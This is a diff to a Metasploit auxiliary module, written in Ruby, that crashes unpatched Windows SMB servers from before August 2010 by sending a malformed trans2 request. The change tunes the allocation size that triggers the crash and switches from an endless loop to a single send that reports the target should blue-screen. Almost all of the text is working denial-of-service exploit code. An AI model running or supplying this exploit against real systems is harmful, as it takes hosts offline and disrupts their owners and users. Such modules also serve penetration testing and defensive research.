@@ -20,9 +20,9 @@ class Metasploit3 < Msf::Auxiliary
 			'Description'    => %q{
 					This module exploits a denial of service flaw in the Microsoft
 				Windows SMB service on versions of Windows prior to the August 2010 Patch
-				Tuesday. To trigger this bug, you must be able to access a share with 
+				Tuesday. To trigger this bug, you must be able to access a share with
 				at least read privileges. That generally means you will need authentication.
-				However, if a system has a guest accessible share, you can trigger it 
+				However, if a system has a guest accessible share, you can trigger it
 				without any authentication.
 			},
 			'References'     =>
@@ -47,6 +47,8 @@ class Metasploit3 < Msf::Auxiliary
 	# Perform a transaction2 request using the specified subcommand, parameters, and data
 	def malformed_trans2(subcommand, param = '', body = '')
 
+		alloc_sz = 0 # between 0-8 causes a crash
+
 		setup_count = 1
 		setup_data = [subcommand].pack('v')
 
@@ -67,7 +69,10 @@ class Metasploit3 < Msf::Auxiliary
 		pkt['Payload'].v['ParamCountTotal'] = param.length
 		pkt['Payload'].v['DataCountTotal'] = body.length
 		pkt['Payload'].v['ParamCountMax'] = 0
-		pkt['Payload'].v['DataCountMax'] = 0
+
+		# this value becomes the allocation size
+		pkt['Payload'].v['DataCountMax'] = alloc_sz
+
 		pkt['Payload'].v['ParamCount'] = param.length
 		pkt['Payload'].v['ParamOffset'] = param_offset + 3
 		pkt['Payload'].v['DataCount'] = body.length
@@ -76,11 +81,11 @@ class Metasploit3 < Msf::Auxiliary
 		pkt['Payload'].v['SetupData'] = setup_data
 
 		pkt['Payload'].v['Payload'] = "\x00\x44\x20" + data
-		
+
 		exploit = pkt.to_s
 		exploit[data_offset,2] = [5].pack('v')
 
-		print_status("\n" + Rex::Text.to_hex_dump(exploit))
+		#print_status("\n" + Rex::Text.to_hex_dump(exploit))
 
 		simple.client.smb_send(exploit)
 
@@ -90,21 +95,21 @@ class Metasploit3 < Msf::Auxiliary
 
 	def run
 
-		loop {
-			connect()
-			
-			simple.login(
-				datastore['SMBName'],
-				datastore['SMBUser'],
-				datastore['SMBPass'],
-				datastore['SMBDomain']
-			)
-			simple.connect("\\\\#{datastore['RHOST']}\\#{datastore['SMBSHARE']}")
+		connect()
 
-			print_status("Sending malformed trans2 request...")
-			malformed_trans2(0x03, "\x05\x01", '')
-			disconnect
-		}
+		simple.login(
+			datastore['SMBName'],
+			datastore['SMBUser'],
+			datastore['SMBPass'],
+			datastore['SMBDomain']
+		)
+		simple.connect("\\\\#{datastore['RHOST']}\\#{datastore['SMBSHARE']}")
+
+		print_status("Sending malformed trans2 request..")
+		malformed_trans2(0x03, "\x05\x01")
+
+		print_status("The target should encounter a blue screen error now.")
+		select(nil, nil, nil, 0.5)
 
 	end
 
